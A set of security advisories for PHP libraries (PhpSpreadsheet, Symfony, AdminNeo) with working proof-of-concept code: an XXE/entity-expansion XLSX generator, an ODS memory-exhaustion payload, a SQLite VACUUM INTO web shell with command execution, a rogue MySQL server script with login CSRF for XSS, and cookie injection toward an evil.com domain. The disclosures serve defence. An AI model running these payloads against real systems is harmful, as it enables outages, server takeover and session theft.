### GHSA-3x94-m842-937c — PhpSpreadsheet: XmlScanner Bypass via ISO-2022 Escape Sequences Allows XXE and Denial of Service
- Aliases: CVE-2026-108358 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-611, CWE-776
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:H/SC:L/SI:N/SA:N`
- Affected Packagist/phpoffice/phpspreadsheet: introduced:4.0.0 fixed:5.10.0
- Affected Packagist/phpoffice/phpspreadsheet: introduced:3.3.0 fixed:3.10.8
- Affected Packagist/phpoffice/phpspreadsheet: introduced:2.2.0 fixed:2.4.8
- Affected Packagist/phpoffice/phpspreadsheet: introduced:2.0.0 fixed:2.1.19
- Affected Packagist/phpoffice/phpspreadsheet: introduced:0 fixed:1.30.7

### Summary
PhpSpreadsheet's `XmlScanner::scan()` uses a regex pattern that only accounts for NULL byte (0x00) interleaving when detecting `<!DOCTYPE`. ISO-2022 escape sequences (0x1B bytes) inserted between the characters of the pattern break the regex match entirely, allowing DOCTYPE declarations with entity definitions to pass through undetected. This enables Denial of Service via quadratic entity expansion on **all PHP versions**, and XXE/SSRF on PHP < 8.0 or when `LIBXML_NOENT` is used. Any application using PhpSpreadsheet to process user-uploaded XLSX files is affected.

### Details
The vulnerability exists in `src/PhpSpreadsheet/Reader/Security/XmlScanner.php`, method `scan()`, lines 87–100.

The scanner builds a regex pattern `/\0*<\0*!\0*D\0*O\0*C\0*T\0*Y\0*P\0*E\0*/` that only handles NULL byte interleaving. ISO-2022 escape sequences (e.g., `0x1B 0x28 0x42` for ISO-2022-JP) inserted between each character of `<!DOCTYPE` break the regex because it only expects optional `\0` between characters.

The XLSX reader extracts XML parts from the ZIP archive and passes each through `XmlScanner::scan()` before `simplexml_load_string()`. The XML parser strips the ESC bytes during charset normalization, producing a valid `<!DOCTYPE` declaration that the scanner never detected.

Seven ISO-2022 encoding variants bypass the scanner:
- ISO-2022-JP (`ESC ( B`)
- ISO-2022-JP-2 (`ESC $ B`)
- ISO-2022-KR (`ESC $ ) C`)
- ISO-2022-CN (`ESC $ ) A`)
- ISO-2022-CN-EXT (`ESC $ ) G`)
- ISO-2022-JP-2004 (`ESC $ ( Q`)
- ISO-2022-JP-MS (`ESC & @ ESC $ B`)

Internal entity expansion (quadratic blowup) is **not blocked** by libxml2 2.9+ defaults, making this directly exploitable for DoS on all modern PHP versions.

### PoC

Save the following as `poc_iso2022.php` in a directory with PhpSpreadsheet installed via Composer:

```php
<?php
require 'vendor/autoload.php';

// ESC ( B = ISO-2022-JP escape sequence (switch to ASCII)
$esc = "\x1b\x28\x42";

// Build <!DOCTYPE with ESC bytes between each character
$doctype = "<".$esc."!".$esc."D".$esc."O".$esc."C".$esc."T".$esc."Y".$esc."P".$esc."E";

// Internal entity for DoS (works on ALL PHP versions)
$entity_value = str_repeat('A', 100000);
$refs = str_repeat('&big;', 200);

$shared_strings = '<?xml version="1.0" encoding="UTF-8"?>' . "\n"
    . $doctype . ' sst [' . "\n"
    . '  <!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"
    . '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">'
    . '<si><t>' . $refs . '</t></si></sst>';

// Build minimal XLSX
$xlsx = new ZipArchive();
$xlsx->open('poc.xlsx', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$xlsx->addFromString('[Content_Types].xml',
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    .'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    .'<Default Extension="xml" ContentType="application/xml"/>'
    .'<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    .'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    .'<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>'
    .'</Types>');
$xlsx->addFromString('_rels/.rels',
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    .'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    .'</Relationships>');
$xlsx->addFromString('xl/workbook.xml',
    '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    .'<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>');
$xlsx->addFromString('xl/_rels/workbook.xml.rels',
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    .'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    .'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>'
    .'</Relationships>');
$xlsx->addFromString('xl/worksheets/sheet1.xml',
    '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
    .'<sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData></worksheet>');
$xlsx->addFromString('xl/sharedStrings.xml', $shared_strings);
$xlsx->close();

echo "XLSX size: " . filesize('poc.xlsx') . " bytes\n";

// Load with PhpSpreadsheet
$mem_before = memory_get_usage(true);
$reader = new \PhpOffice\PhpSpreadsheet\Reader\Xlsx();
$reader->setReadDataOnly(true);
$spreadsheet = $reader->load('poc.xlsx');
$peak = memory_get_peak_usage(true);

echo "Peak memory: " . round($peak / 1024 / 1024, 1) . " MB\n";

$val = $spreadsheet->getActiveSheet()->getCell('A1')->getValue();
echo "Cell A1 length: " . strlen($val) . " bytes\n";
echo "Entity expansion: " . (strlen($val) > 10000 ? "CONFIRMED" : "not detected") . "\n";
```

Run: `php -d memory_limit=512M poc_iso2022.php`

**Expected result:** The scanner does not detect the DOCTYPE. The XLSX loads successfully. Internal entities expand, consuming ~45 MB of memory from a ~2 KB file.

**Tested on:** PhpSpreadsheet 5.9.0, PHP 8.5.3, libxml2 2.9.13.

### Impact

| Attack | PHP < 8.0 / libxml2 < 2.9 | PHP 8.x / libxml2 2.9+ |
|--------|---------------------------|------------------------|
| Denial of Service (quadratic blowup) | **Exploitable** | **Exploitable** |
| Local file read via SYSTEM entity | **Exploitable** | Blocked by default |
| SSRF via SYSTEM entity | **Exploitable** | Blocked by default |
| File read when LIBXML_NOENT is used | **Exploitable** | **Exploitable** |

Any application that accepts user-uploaded XLSX files and processes them with PhpSpreadsheet is vulnerable. The DoS impact is the most severe because it requires no special PHP configuration and works on all supported PHP versions. A 2 KB XLSX causes 45 MB peak memory usage (22,000:1 amplification ratio). Multiple concurrent uploads can exhaust server memory.

### GHSA-j2w7-387v-m2rq — PhpSpreadsheet ODS Reader: Unbounded number-rows-repeated → CPU & Memory Exhaustion (DoS)
- Aliases: CVE-2026-108359 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-400, CWE-789
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Packagist/phpoffice/phpspreadsheet: introduced:4.0.0 fixed:5.10.0
- Affected Packagist/phpoffice/phpspreadsheet: introduced:3.3.0 fixed:3.10.8
- Affected Packagist/phpoffice/phpspreadsheet: introduced:2.2.0 fixed:2.4.8
- Affected Packagist/phpoffice/phpspreadsheet: introduced:2.0.0 fixed:2.1.19
- Affected Packagist/phpoffice/phpspreadsheet: introduced:0 fixed:1.30.7

## Summary

When PhpSpreadsheet loads an OpenDocument Spreadsheet (`.ods`), `Ods::processTableRow()`
reads the `table:number-rows-repeated` attribute of a `<table:table-row>` with an unchecked 
`(int)` cast, then materialises one cell per repeated row. This value is **completely unbounded**, 
so a **single ~1.4 KB file** can instruct the reader to create up to **millions of cells**, 
exhausting memory (fatal OOM). No authentication, no special configuration, and the default read 
filter are required - any application that loads a user-supplied `.ods` is affected.

---

## Affected versions

The `number-rows-repeated` expansion has existed in the ODS reader since its inception
(pre-dating the current release branches), so all maintained lines are affected.

| Branch | Affected |
|--------|----------|
| 1.x    | ≤ 1.30.6 |
| 2.0–2.1 | ≤ 2.1.18 |
| 2.2–2.4 | ≤ 2.4.7 |
| 3.x    | ≤ 3.10.7 |
| 4.x–5.x | ≤ 5.9.0 (latest) |

---

## Root cause (source → sink)

`src/PhpSpreadsheet/Reader/Ods.php`:

```php
// line 816 — row repeat, unchecked (int) cast
$rowRepeats = (int) $childNode->getAttributeNS($tableNs, 'number-rows-repeated');
...
// line 1151 — row materialisation loop: NO upper bound
for ($rowAdjust = 0; $rowAdjust < $rowRepeats; ++$rowAdjust) {
    $rID = $rowID + $rowAdjust;
    $cell = $spreadsheet->getActiveSheet()->getCell($columnID . $rID);  // allocates a Cell
    $cell->setValueExplicit($dataValue, $type);
    // ... no bounds check on $rowAdjust or $rID ...
}
```

**Why columns are NOT vulnerable (already bounded):**

The column-header loop at line 1326 shows the correct pattern with bounds checking:

```php
// line 1326 (processTableColumnHeader): BOUNDED correctly
for ($rowRepeats2 = $rowRepeats; $rowRepeats2 > 0 && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT; --$rowRepeats2) {
    // HAS BOUNDS CHECK: && $tableColumnIndex2 <= AddressRange::MAX_COLUMN_INT
}
```

Additionally, the cell-data column loop at line 1141 calls `getCell()` which throws exception 
at `Coordinate.php:448` when column exceeds `MAX_COLUMN_INT` (XFD / 16,384):

```php
// Coordinate.php line 448
if ($columnIndex > self::MAX_COLUMN_INT) {
    throw new Exception('Column string index can not be beyond XFD');
}
```

**Result:** Columns are capped at 16,384. Only rows are unbounded.

---

## Impact

**Memory exhaustion (single valued cell, repeated many rows):**  
A non-null cell value with a huge `number-rows-repeated` attribute materialises millions of 
`Cell` objects → PHP fatal `Allowed memory size ... exhausted`.

**Example:**
- Payload: `<table:table-row table:number-rows-repeated="5000000">` (5 million rows)
- File size: 1.4 KB
- Memory consumed: ~256 MB (one Cell object per row)
- Result: OOM at default memory limit

---

## Reproduction

**Vulnerable payload (causes OOM):**

```xml
<table:table table:name="Sheet1">
 <table:table-row table:number-rows-repeated="5000000">
  <table:table-cell office:value-type="float" office:value="1">
   <text:p>1</text:p>
  </table:table-cell>
 </table:table-row>
</table:table>
```

**Not vulnerable (for reference - throws exception):**

```xml
<table:table table:name="Sheet1">
 <table:table-row>
  <table:table-cell office:value-type="float" office:value="1"
      table:number-columns-repeated="1000000000">
   <text:p>1</text:p>
  </table:table-cell>
 </table:table-row>
</table:table>
```

This column-repeat example throws `Column string index can not be beyond XFD` exception
(bounded defense, already in place).

### GHSA-r925-mgvr-h9cc — Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header
- Aliases: CVE-2026-108082 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-1333
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Packagist/symfony/http-foundation: introduced:6.0.1 fixed:6.4.46
- Affected Packagist/symfony/http-foundation: introduced:7.0.0 fixed:7.4.19
- Affected Packagist/symfony/http-foundation: introduced:8.0.0 fixed:8.1.7
- Affected Packagist/symfony/symfony: introduced:6.0.1 fixed:6.4.46
- Affected Packagist/symfony/symfony: introduced:7.0.0 fixed:7.4.19
- Affected Packagist/symfony/symfony: introduced:8.0.0 fixed:8.1.7
- Affected Packagist/symfony/http-foundation: introduced:4.1.0 fixed:5.4.54
- Affected Packagist/symfony/symfony: introduced:4.1.0 fixed:5.4.54

### Description

`HeaderUtils::split()` parsed header values with a pattern whose token alternative also matched whitespace, followed by a `(?<!\s)` lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. `HeaderBag` calls it for the `Cache-Control` header whenever a `Request` is built, so any application handling HTTP requests is reachable, with no authentication.

A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, `preg_match_all()` gives up at `pcre.backtrack_limit` and `split()` returns an empty array, so every directive of the header is silently dropped.

### Resolution

The pattern now consumes whitespace only when more of the value follows it, so a value can no longer end on whitespace, nothing has to be given back, and every quantifier is possessive. The first release of this fix broke splitting on a whitespace separator: `HeaderUtils::split('foo bar', ' ')` returned a single value in 6.4.46 to 6.4.47, 7.4.19 to 7.4.20 and 8.1.7 to 8.1.8. Whitespace characters used as separators are now left out of the whitespace branch, which 6.4.48, 7.4.21 and 8.1.9 contain.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

Symfony would like to thank [r3verii](https://github.com/r3verii) for reporting the issue and Nicolas Grekas for providing the fix.

Symfony would also like to thank [Bruno Dias](https://github.com/cx-bruno-dias) from Checkmarx for his help getting a CVE assigned.

### GHSA-2v3c-qxhr-7vpv — Symfony: Unbounded Recursion in the YAML Inline Lexer Lets a Single Document Crash the Process
- Aliases: CVE-2026-109413 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-674
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Packagist/symfony/symfony: introduced:2.0.0 fixed:5.4.54
- Affected Packagist/symfony/symfony: introduced:6.0.0 fixed:6.4.45
- Affected Packagist/symfony/symfony: introduced:7.0.0 fixed:7.4.18
- Affected Packagist/symfony/symfony: introduced:8.0.0 fixed:8.1.6
- Affected Packagist/symfony/yaml: introduced:2.0.0 fixed:5.4.54
- Affected Packagist/symfony/yaml: introduced:6.0.0 fixed:6.4.45
- Affected Packagist/symfony/yaml: introduced:7.0.0 fixed:7.4.18
- Affected Packagist/symfony/yaml: introduced:8.0.0 fixed:8.1.6

### Description

`Yaml\Parser::lexInlineStructure()` recursed through `lexInlineMapping()` and `lexInlineSequence()` for every `{` and `[` of an inline collection, without entering the nesting level that the rest of the parser bounds with `maxNestingLevel`. A document made of deeply nested inline collections, such as `[[[[...]]]]`, exhausted the stack while it was being lexed: depending on the PHP version and its stack settings, the process crashed or the request ended with a fatal error.

Any code parsing untrusted YAML is affected. That includes `#[MapRequestPayload]` when the Yaml component is installed and the endpoint does not restrict `acceptFormat`: a single unauthenticated request with a YAML content type is enough.

### Resolution

The inline lexer now enters and leaves the same nesting level as the rest of the parser, so nested inline collections are bounded by `maxNestingLevel`, and the parser raises a `ParseException` beyond it.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/2a8bf9c58d862b0c76a35ce288d1ba6a27223aad) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

We would like to thank Nicolas Grekas for reporting the issue and providing the fix.

### GHSA-jm85-8cpp-9cjc — AdminNeo: version-cache array injection causes persistent denial of service
- Aliases: CVE-2026-59978 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-20
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Packagist/adminneo-org/adminneo: introduced:4.6.2 fixed:5.5.0

### Summary
AdminNeo v5.4.1 gets the latest version from GitHub API in a browser JavaScript function. Version number is then sent by POST request to `?script=version`. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST `version[]` parameter which PHP converts to an array. On next page load, function `rawurlencode()` receives this array instead of string and throws `TypeError`, returning HTTP 500 to all users for the next 24 hours.

Originally reported by @JoyGhoshs in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh
Although the version checking process was modified in AdminNeo, the root cause persisted.

### Workaround
If you can't upgrade, make the file `adminneo.version` in temp directory (usually the value of [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) unwritable by web server.

### Details
#### 1. Intended design of `?script=version`
The endpoint is designed to receive version data from GitHub via browser JavaScript.
- `functions.js` line 110-121: Receives the latest release information from GitHub API by AJAX.
- JavaScript POSTs version number to `?script=version`.
- Server stores version number in `/tmp/adminneo.version` file that is used as a shared cache for all users in the same server for the next 24 hours.

```js
// function.js lines 119-120
const data = 'version=' + version + '&token=' + token;
ajax(baseUrl + 'script=version', null, data);
```

#### 2. The vulnerability

The endpoint only checks `$_GET["script"] == "version"` - it does not validate:
- Request origin (CSRF token is present, but not checked for this endpoint)
- Request source (any HTTP client can POST)
- Parameter types (`version` expected as string, array not rejected)

```php
// bootstrap.inc.php lines 44-53
if ($_GET["script"] == "version") {
	$filename = get_temp_dir() . "/adminneo.version";
	@unlink($filename); // It may not be writable by us, @ - it may not exist.

	$file = open_file_with_lock($filename);
	if ($file) {
		write_and_unlock_file($file, serialize(["version" => $_POST["version"]]));
	}
	exit;
}
```

#### 3. Type confusion crash
When POST contains `version[]` instead of `version`, PHP creates an array. When AdminNeo reads this file and passes to `cookie()` and then to `rawurlencode()`:

```php
// design.inc.php line 40
cookie("neo_version", $data["version"], $lifetime); // Sync expiration with the file.

// functions.inc.php lines 398-405
function cookie(string $name, string $value, int $lifetime = 2592000): void
{
	header("Set-Cookie: $name=" . rawurlencode($value)
		. ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
		. "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
		. (HTTPS ? "; secure" : "")
		. "; HttpOnly; SameSite=lax",
		false);
}
```

PHP 8.x throws:

```
Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
```

### Steps to Reproduce

(Example URL is for the official AdminNeo Docker image.)

**Step 1:** Verify AdminNeo is running and accessible.

```sh
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
```

Expected output:

```
200
```

**Step 2:** Send the malicious POST request. The `version[]` syntax causes PHP to create an array instead of a string.

```sh
curl -X POST "http://localhost:8080?script=version" -d "version[]=INJECTED"
```

Expected output: Empty response (no error).

**Step 3:** Access Adminer again to trigger the crash.

```sh
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
```

Expected output:

```
500
```

**Step 4:** (Optional) View the PHP error in server logs.

```
Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
```

**Step 5:** (Optional) Inspect the poisoned file.

```sh
cat /tmp/adminneo.version
```

Expected output:

```
a:1:{s:7:"version";a:1:{i:0;s:8:"INJECTED";}}
```

**Recovery:**

```sh
rm /tmp/adminer.version
```

After deletion, AdminNeo returns HTTP 200.

<hr>

### Impact

**Type:** Denial of Service

**Root cause:** The `?script=version` endpoint is designed to receive data from GitHub via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before `rawurlencode()`, this allows DoS for the next 24 hours.

**Affected users:** Any AdminNeo instance accessible over the network.

- https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907 [WEB]
- https://github.com/adminneo-org/adminneo [PACKAGE]
- https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0 [WEB]

### GHSA-q5mp-gfjf-cf2j — AdminNeo: RCE via SQLite VACUUM INTO (ATTACH Blocklist Bypass)
- Aliases: CVE-2026-96630 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
- Affected Packagist/adminneo-org/adminneo: introduced:0 fixed:5.5.1

## Summary
Adminer blocks `ATTACH` queries for SQLite to prevent arbitrary file creation. However, `VACUUM INTO` is not blocked and achieves the same result: writing a database file containing attacker-controlled PHP code to any path with any extension. An authenticated SQLite user can write a web shell to the web root and execute commands.

Originally reported in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-gmx3-g29w-77wf)

## Root Cause
sql.inc.php, line 146:

```php
if (DIALECT == "sqlite" && preg_match("~^$space*+ATTACH\\b~i", $q, $match)) {
    // blocked
}
```

Only `ATTACH` is in the blocklist. `VACUUM INTO` (available since SQLite 3.27.0) writes the entire database to a new file at an arbitrary path with an arbitrary extension. It is not checked.

## Steps To Reproduce

### 1.  Login to SQLite
1. Open AdminNeo and select driver: **SQLite**
2. Login and create a new database (e.g., `stage.db`)

### 2. Inject PHP code and write the shell

Navigate to **SQL command** and execute:

```sql
CREATE TABLE "<?php system($_GET['c']); ?>" (i int);
VACUUM INTO '/var/www/html/shell.php';
```

The SQLite file is written to `/var/www/html/shell.php`. The table name containing `<?php` appears as raw bytes in the file. PHP's parser finds and executes it.

### 3. Execute commands

```shell
curl "http://TARGET/shell.php?c=id"
# uid=0(root) gid=0(root) groups=0(root)
```

## Collaborator Request

This vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!

### GHSA-rx7m-wxwq-vxr9 — AdminNeo Vulnerable to XSS via Rogue MySQL Server Version String (CSP Nonce Bypass)
- Aliases: CVE-2026-96632 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-79
- CVSS_V4: `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- Affected Packagist/adminneo-org/adminneo: introduced:0 fixed:5.5.1

## Summary

AdminNeo inserts the database server's version string into a `<script>` tag that carries a valid CSP nonce, without any sanitization. A rogue database server can return a crafted version string that breaks out of the JavaScript context and executes arbitrary code. Because the script tag already has a valid nonce, the browser's Content Security Policy does not block execution. No authentication is required when combined with Login CSRF.

Originally reported in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj

## Prerequisites

- Target runs AdminNeo
- Attacker controls a reachable MySQL server (a 80-line Python script)

## Root Cause

`admin/core/Admin.php`, lines 1285-1286:

```php
echo script("let autocompletion;\nwindow.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('" .
    Connection::get()->getVersion() . "', '" . Connection::get()->getFlavor() . "', autocompletion); });");
```

`script()` wraps the output in `<script nonce="VALID_NONCE">`. Return value of `Connection::get()->getVersion()` is not escaped.

## Steps To Reproduce

### 1. Build the environment

**Dockerfile** (AdminNeo):

```dockerfile
FROM php:8.3-cli
COPY adminneo.php /var/www/adminneo.php
WORKDIR /var/www
EXPOSE 8081
CMD ["php", "-S", "0.0.0.0:8081"]
```

**rogue_mysql.py** (fake MySQL server that accepts any login):

```python
import socket, struct, threading

PAYLOAD = "1');alert(origin)//"

# Capability flags the client expects
CAP_PROTOCOL_41     = 0x0200
CAP_SECURE_CONNECTION = 0x8000
CAP_PLUGIN_AUTH     = 0x00080000
CAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION
CAPS_HIGH = (CAP_PLUGIN_AUTH >> 16)

def make_packet(seq, payload):
    length = struct.pack("<I", len(payload))[:3]
    return length + bytes([seq]) + payload

def make_greeting(version_str):
    pkt  = b"\x0a"                                  # protocol version 10
    pkt += version_str.encode() + b"\x00"            # version string
    pkt += struct.pack("<I", 1)                      # connection id
    pkt += b"\x41" * 8                               # auth plugin data part 1
    pkt += b"\x00"                                   # filler
    pkt += struct.pack("<H", CAPS_LOW)               # capability flags lower
    pkt += b"\x21"                                   # charset utf8
    pkt += struct.pack("<H", 0x0002)                 # status flags
    pkt += struct.pack("<H", CAPS_HIGH)              # capability flags upper
    pkt += b"\x15"                                   # auth data length (21)
    pkt += b"\x00" * 10                              # reserved
    pkt += b"\x41" * 12 + b"\x00"                    # auth plugin data part 2
    pkt += b"mysql_native_password\x00"              # auth plugin name
    return make_packet(0, pkt)

def make_ok(seq):
    pkt  = b"\x00"          # OK marker
    pkt += b"\x00"          # affected rows
    pkt += b"\x00"          # last insert id
    pkt += struct.pack("<H", 0x0002)  # status flags
    pkt += struct.pack("<H", 0)       # warnings
    return make_packet(seq, pkt)

def make_eof(seq):
    pkt  = b"\xfe"
    pkt += struct.pack("<H", 0)       # warnings
    pkt += struct.pack("<H", 0x0002)  # status flags
    return make_packet(seq, pkt)

def make_err(seq, msg=b"not supported"):
    pkt  = b"\xff"
    pkt += struct.pack("<H", 1045)
    pkt += b"#HY000"
    pkt += msg
    return make_packet(seq, pkt)

def handle(conn):
    conn.sendall(make_greeting(PAYLOAD))
    try:
        conn.recv(4096)     # client login request
    except Exception:
        conn.close()
        return
    conn.sendall(make_ok(2))  # accept login

    # Answer any queries Adminer sends after login
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            seq = data[3] + 1
            # Send ERR for all queries (Adminer still has the version in memory)
            conn.sendall(make_err(seq))
        except Exception:
            break
    conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 3307))
srv.listen(5)
print("[*] Rogue MySQL on :3307 - version: " + PAYLOAD)
while True:
    conn, addr = srv.accept()
    print(f"[+] Connection from {addr}")
    threading.Thread(target=handle, args=(conn,)).start()
```

```shell
# Terminal 1: start Adminer
docker build -t adminer-xss .
docker run -d -p 8081:8081 --name adminer-xss adminer-xss

# Terminal 2: start rogue MySQL
python3 rogue_mysql.py
```

### 2. Trigger the XSS

Open a browser and navigate to `http://localhost:8081/adminneo.php`:

1. Select driver: **MySQL**
2. Server: `HOST_IP:3307` (IP of the machine running rogue_mysql.py)
3. Username: `root`
4. Password: `x`
5. Click Login.

The rogue server accepts the login. AdminNeo renders the dashboard and includes:

```html
<script nonce="REAL_NONCE">let autocompletion;
window.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('1');alert(origin)//', 'mysql', autocompletion); });</script>
```

The browser executes `alert(origin)` with full CSP bypass because the script tag carries a valid nonce.

### 3. Trigger it via Login CSRF

The login form has no CSRF token. An attacker page auto-submits the login, forcing the victim's browser to connect to the rogue server:

```html
<form id="f" method="POST" action="http://TARGET/adminneo.php">
  <input name="auth[driver]" value="mysql">
  <input name="auth[server]" value="ROGUE_IP:3307">
  <input name="auth[username]" value="root">
  <input name="auth[password]" value="x">
</form>
<script>document.getElementById('f').submit()</script>
```

### GHSA-79wv-8rh2-9vp2 — AdminNeo has Cookie Attribute Injection via Unsanitized X-Forwarded-Prefix in Set-Cookie Headers
- Aliases: CVE-2026-96631 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-113, CWE-20
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
- Affected Packagist/adminneo-org/adminneo: introduced:4.6.0 fixed:5.5.1

### Summary

AdminNeo versions 4.6.0 through at least 5.5.0 are vulnerable to cookie attribute injection via the `X-Forwarded-Prefix` HTTP header. An attacker who can influence this header (e.g., through a reverse proxy that forwards it from clients, an attacker-controlled upstream proxy, or a man-in-the-middle position) can inject arbitrary cookie attributes including `Domain`, `Path`, `Secure`, and `SameSite` into all `Set-Cookie` response headers emitted by AdminNeo.

This allows an attacker to expand the cookie scope to an attacker-controlled domain (e.g., `Domain=.evil.com`), causing the victim's browser to send AdminNeo's `neo_sid` (session ID) and `neo_key` (database password encryption key) cookies to the attacker's server on subsequent requests.

Originally reported by @retkoussa in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h

### Vulnerable Code

**Root cause 1 - Unsanitized header prepended to `REQUEST_URI`**
(`admin/include/bootstrap.inc.php`, lines 50–52):

```php
if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
	$_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_FORWARDED_PREFIX"] . $_SERVER["REQUEST_URI"];
}
```

The client-supplied `X-Forwarded-Prefix` header is concatenated into `REQUEST_URI` with no validation or sanitization of special characters (specifically semicolons, which delimit cookie attributes).

**Root cause 2 - Manual `Set-Cookie `header construction without escaping**
(`admin/include/functions.inc.php`, lines 416–424):

```php
function cookie(string $name, string $value, int $lifetime = 2592000): void
{
	header("Set-Cookie: $name=" . rawurlencode($value)
		. ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
		. "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
		. (HTTPS ? "; secure" : "")
		. "; HttpOnly; SameSite=lax",
		false);
}
```

The tainted `REQUEST_URI` is interpolated directly into the `path=` attribute of the `Set-Cookie` header. Since semicolons are not stripped or escaped, any `;`-separated directives injected via `X-Forwarded-Prefix` become valid cookie attributes parsed by the browser.

**Root cause 3 - Session cookie also tainted**
(`admin/include/bootstrap.inc.php`, line 61):

```php
session_set_cookie_params(0, preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"]), "", HTTPS, true);
```

The PHP session cookie (`neo_sid`) path is similarly derived from the tainted `REQUEST_URI`, extending the same vulnerability to the session cookie set by PHP itself.

### Impact

- **Session hijacking:** The `neo_sid` session cookie is sent to the attacker's domain, allowing full session takeover.
- **Credential theft:** The `neo_key` cookie contains the key used to encrypt/decrypt database passwords stored in the session. With this key, an attacker can decrypt saved database credentials.
- **Session fixation:** An attacker can inject arbitrary `Path`, `SameSite`, and `Secure` attributes, manipulating cookie behavior.
